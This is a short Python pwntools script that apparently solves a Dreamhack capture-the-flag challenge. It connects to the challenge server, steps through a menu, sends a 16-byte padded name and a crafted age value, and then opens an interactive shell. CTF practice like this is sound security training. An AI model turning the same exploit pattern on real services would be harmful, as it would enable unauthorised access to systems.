from pwn import *

p=remote("host3.dreamhack.games",12934)

name=b"A"*0x10
age=str(int(2142))
p.sendlineafter("> ",b"3")
p.sendlineafter("> ",b"1")
p.sendlineafter("Name: ",name)
p.sendlineafter("Age: ",age)
p.sendlineafter("> ",b"2")

p.interactive()